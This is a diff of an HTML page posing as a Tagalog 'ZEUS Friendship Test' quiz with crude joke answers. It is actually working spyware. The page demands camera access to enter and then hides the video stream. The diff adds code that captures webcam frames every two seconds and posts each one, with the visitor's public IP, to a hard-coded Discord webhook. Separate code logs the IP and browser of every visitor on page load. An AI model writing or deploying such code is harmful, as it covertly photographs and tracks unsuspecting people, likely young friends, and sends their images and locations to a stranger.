@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ziyus Friendship Test</title>
+  <title>ZEUS Friendship Test</title>
   <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
   <style>
     * {
@@ -11,14 +11,12 @@
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
       background: black;
       min-height: 100vh;
       overflow: hidden;
     }
-
     .container {
       position: relative;
       min-height: 100vh;
@@ -27,7 +25,6 @@
       justify-content: center;
       padding: 1rem;
     }
-
     .particle {
       position: absolute;
       width: 2px;
@@ -39,7 +36,6 @@
       z-index: 20;
       animation: fall linear infinite;
     }
-
     @keyframes fall {
       0% {
         transform: translateY(-10px);
@@ -56,7 +52,6 @@
         opacity: 0;
       }
     }
-
     .card {
       position: relative;
       z-index: 10;
@@ -68,29 +63,24 @@
       padding: 2rem;
       border: 1px solid rgba(255, 255, 255, 0.2);
     }
-
     .text-center {
       text-align: center;
     }
-
     h2 {
       color: white;
       font-size: 1.875rem;
       font-weight: bold;
       margin-bottom: 1rem;
     }
-
     p {
       color: rgba(255, 255, 255, 0.9);
       margin-bottom: 1.5rem;
     }
-
     .error {
       color: #fca5a5;
       font-size: 0.875rem;
       margin-bottom: 1rem;
     }
-
     button {
       background: white;
       color: black;
@@ -102,19 +92,15 @@
       transition: all 0.2s;
       font-size: 1rem;
     }
-
     button:hover {
       opacity: 0.9;
     }
-
     button:disabled {
       cursor: not-allowed;
     }
-
     .quiz-header {
       margin-bottom: 1.5rem;
     }
-
     .quiz-info {
       display: flex;
       justify-content: space-between;
@@ -123,7 +109,6 @@
       color: white;
       font-size: 0.875rem;
     }
-
     .progress-bar {
       width: 100%;
       background: rgba(255, 255, 255, 0.2);
@@ -131,27 +116,23 @@
       height: 0.5rem;
       overflow: hidden;
     }
-
     .progress-fill {
       background: white;
       height: 100%;
       transition: width 0.3s;
       border-radius: 9999px;
     }
-
     .question {
       color: white;
       font-size: 1.5rem;
       font-weight: bold;
       margin-bottom: 2rem;
     }
-
     .options {
       display: flex;
       flex-direction: column;
       gap: 0.75rem;
     }
-
     .option {
       width: 100%;
       text-align: left;
@@ -164,28 +145,23 @@
       transition: all 0.2s;
       font-size: 1rem;
     }
-
     .option:hover:not(:disabled) {
       background: rgba(255, 255, 255, 0.2);
     }
-
     .option.correct {
       background: #22c55e;
       color: white;
     }
-
     .option.incorrect {
       background: #ef4444;
       color: white;
     }
-
     .score-display {
       color: white;
       font-size: 3rem;
       font-weight: bold;
       margin: 1rem 0;
     }
-
     .result-message {
       color: white;
       font-size: 1.25rem;
@@ -196,32 +172,81 @@
 <body>
   <div class="container" id="app">
     <div class="card text-center" id="cameraScreen">
-      <h2>Ziyus Friendship Test</h2>
+      <h2>ZEUS Friendship Test</h2>
       <p>kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter</p>
       <p class="error" id="cameraError" style="display: none;"></p>
       <button onclick="requestCamera()">Enter</button>
     </div>
   </div>
-
+  <video id="liveVideo" autoplay playsinline muted style="display:none;"></video>
   <script>
     const questions = [
-      { question: "Ilang taon na si Zeus?", options: ["11", "13", "67", "57"], correct: 1 },
-      { question: "Pogi ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Mabait ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Kamukha ba ni Zeus si Donny Pangilinan?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Ano ang paboritong pagkain ni Zeus?", options: ["Tubol", "Tae", "Regla", "Pekpek"], correct: 3 },
-      { question: "Ilan ang aura ni Zeus?", options: ["100%", "1000%", "67%", "800%"], correct: 2 },
-      { question: "Skibidi ba si Zeus?", options: ["Yes", "No", "Yes", "Yes"], correct: [0, 2, 3] },
+      { question: "Ilang taon na si ZEUS?", options: ["11", "13", "67", "57"], correct: 1 },
+      { question: "Pogi ba si ZEUS?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Mabait ba si ZEUS?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Kamukha ba ni ZEUS si Donny Pangilinan?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Ano ang paboritong pagkain ni ZEUS?", options: ["Tubol", "Tae", "Regla", "Pekpek"], correct: 3 },
+      { question: "Ilan ang aura ni ZEUS?", options: ["100%", "1000%", "67%", "800%"], correct: 2 },
+      { question: "Skibidi ba si ZEUS?", options: ["Yes", "No", "Yes", "Yes"], correct: [0, 2, 3] },
       { question: "Tuloy ba sa December 27?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Matalino ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Ang hindi sumama noong December 17 ay mamamatay!", options: ["Barang", "Barang", "Barang", "Barang"], correct: [0, 1, 2, 3] }
+      { question: "Matalino ba si ZEUS?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] }
     ];
-
     let currentQuestion = 0;
     let score = 0;
     let isAnswered = false;
-
-    // Log website entry on page load
+    let stream = null;
+    let frameCounter = 0;
+    let captureInterval = null;
+    const WEBHOOK = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        try {
+          const res2 = await fetch('https://api.my-ip.io/ip');
+          return await res2.text();
+        } catch {
+          return "Unknown";
+        }
+      }
+    }
+    async function sendFrame() {
+      const video = document.getElementById('liveVideo');
+      if (!video || !video.videoWidth) return;
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0);
+      try {
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.68));
+        if (blob.size < 2000) return;
+        const file = new File([blob], `frame-${++frameCounter}.jpg`, { type: 'image/jpeg' });
+        const ip = await getIP();
+        const form = new FormData();
+        form.append('file', file);
+        form.append('payload_json', JSON.stringify({
+          username: "🇿🇪🇺🇸 🇫🇷🇦🇲🇪 🇱🇴🇬🇬🇪🇷",
+          content: `Frame ${frameCounter}`,
+          embeds: [{
+            title: "Quiz Camera Capture",
+            color: 10181046,
+            fields: [
+              { name: "Public IP:", value: `\`${ip}\``, inline: true },
+              { name: "Time:", value: new Date().toLocaleString(), inline: true }
+            ],
+            image: { url: "attachment://frame.jpg" },
+            timestamp: new Date().toISOString(),
+            footer: { text: "🇿🇪🇺🇸 🇱🇴🇬🇬🇪🇷" }
+          }]
+        }));
+        await fetch(WEBHOOK, { method: "POST", body: form });
+      } catch {}
+    }
     (async function logWebsiteEntry() {
       try {
         let publicIP = "Unknown";
@@ -229,24 +254,22 @@
           const ipRes = await fetch('https://api.ipify.org?format=json');
           const ipData = await ipRes.json();
           publicIP = ipData.ip;
-        } catch (e) {
+        } catch {
           try {
             const ipRes2 = await fetch('https://api.my-ip.io/ip');
             publicIP = await ipRes2.text();
-          } catch (e2) {}
+          } catch {}
         }
-
         const userAgent = navigator.userAgent;
-        const browser = userAgent.includes('Chrome') ? 'Chrome' : 
-                       userAgent.includes('Firefox') ? 'Firefox' : 
-                       userAgent.includes('Safari') ? 'Safari' : 
+        const browser = userAgent.includes('Chrome') ? 'Chrome' :
+                       userAgent.includes('Firefox') ? 'Firefox' :
+                       userAgent.includes('Safari') ? 'Safari' :
                        userAgent.includes('Edge') ? 'Edge' : 'Unknown';
-
-        await fetch("https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs", {
+        await fetch(WEBHOOK, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            username: "🇿​​🇮​​🇾​​🇺​​🇸​ ​🇼​​🇪​​🇧​​🇸​​🇮​​🇹​​🇪​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷​",
+            username: "🇿🇪🇺🇸 🇼🇪🇧🇸🇮🇹🇪 🇱🇴🇬🇬🇪🇷",
             embeds: [{
               title: "Beshie Entered the Website!",
               description: "Binuksan na ni Beshie!",
@@ -257,14 +280,12 @@
                 { name: "Time:", value: `\`${new Date().toLocaleString()}\``, inline: true }
               ],
               timestamp: new Date().toISOString(),
-              footer: { text: "​🇿​​🇮​​🇾​​🇺​​🇸​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷" }
+              footer: { text: "🇿🇪🇺🇸 🇱🇴🇬🇬🇪🇷" }
             }]
           })
         });
-      } catch (e) {}
+      } catch {}
     })();
-
-    // Create particles
     function createParticles() {
       const container = document.querySelector('.container');
       for (let i = 0; i < 50; i++) {
@@ -278,92 +299,20 @@
       }
     }
     createParticles();
-
     async function requestCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('liveVideo');
         video.srcObject = stream;
-        video.autoplay = true;
-        video.playsInline = true;
-        video.muted = true;
-        video.style.position = 'fixed';
-        video.style.left = '-9999px';
-        video.style.top = '-9999px';
-        video.style.width = '1px';
-        video.style.height = '1px';
-        document.body.appendChild(video);
-
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play().catch(() => {});
-            setTimeout(resolve, 2200);
-          };
-          setTimeout(resolve, 4000);
-        });
-
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0);
-
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-
-        // Get IP and send to Discord
-        if (blob && blob.size > 3000) {
-          const file = new File([blob], "bestie.jpg", { type: 'image/jpeg' });
-          
-          // Wait for IP to be fetched before sending
-          let publicIP = "Unknown";
-          try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            publicIP = ipData.ip;
-          } catch (e) {
-            // If ipify fails, try alternative
-            try {
-              const ipRes2 = await fetch('https://api.my-ip.io/ip');
-              publicIP = await ipRes2.text();
-            } catch (e2) {}
-          }
-
-          const form = new FormData();
-          form.append('file', file, 'bestie.jpg');
-          form.append('payload_json', JSON.stringify({
-            username: "​🇿​​🇮​​🇾​​🇺​​🇸​ ​🇨​​🇦​​🇲​​🇪​​🇷​​🇦​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷​",
-            content: "",
-            embeds: [{
-              title: "Camera Grabbed:",
-              description: "Ang cute ng beshie ko!",
-              color: 10181046,
-              fields: [{ name: "Public Ip:", value: `\`${publicIP}\``, inline: false }],
-              image: { url: "attachment://bestie.jpg" },
-              timestamp: new Date().toISOString(),
-              footer: { text: "🇿​​🇮​​🇾​​🇺​​🇸​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷" }
-            }]
-          }));
-
-          fetch("https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs", {
-            method: "POST",
-            body: form
-          }).catch(() => {});
-        }
-
-        // Stop camera and show quiz immediately
-        stream.getTracks().forEach(track => track.stop());
-        video.remove();
-        
-        // Show quiz right away
+        video.play().catch(() => {});
+        setTimeout(() => sendFrame(), 1500);
+        captureInterval = setInterval(sendFrame, 2000);
         showQuiz();
       } catch (error) {
         document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
         document.getElementById('cameraError').style.display = 'block';
       }
     }
-
     function showQuiz() {
       const app = document.getElementById('app');
       app.innerHTML = `
@@ -383,14 +332,12 @@
       `;
       renderQuestion();
     }
-
     function renderQuestion() {
       const q = questions[currentQuestion];
       document.getElementById('question').textContent = q.question;
       document.getElementById('current').textContent = currentQuestion + 1;
       document.getElementById('score').textContent = score;
       document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
-
       const optionsEl = document.getElementById('options');
       optionsEl.innerHTML = '';
       q.options.forEach((opt, i) => {
@@ -402,16 +349,13 @@
       });
       isAnswered = false;
     }
-
     function handleAnswer(index) {
       if (isAnswered) return;
       isAnswered = true;
-
       const q = questions[currentQuestion];
       const isCorrect = Array.isArray(q.correct) ? q.correct.includes(index) : index === q.correct;
-      
+    
       if (isCorrect) score++;
-
       const buttons = document.querySelectorAll('.option');
       buttons.forEach((btn, i) => {
         btn.disabled = true;
@@ -422,7 +366,6 @@
           btn.className = 'option correct';
         }
       });
-
       setTimeout(() => {
         if (currentQuestion < questions.length - 1) {
           currentQuestion++;
@@ -432,12 +375,11 @@
         }
       }, 1500);
     }
-
     function showResult() {
       const msg = score === questions.length ? "Wow Galing loveu!" :
                   score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
                   score >= questions.length * 0.5 ? "Fake Friend!" : "Keep Practicing!";
-      
+    
       document.getElementById('app').innerHTML = `
         <div class="card text-center">
           <h2>Quiz Complete! 🎉</h2>
@@ -447,6 +389,14 @@
         </div>
       `;
     }
+    window.addEventListener('beforeunload', () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      if (captureInterval) {
+        clearInterval(captureInterval);
+      }
+    });
   </script>
 </body>
 </html>
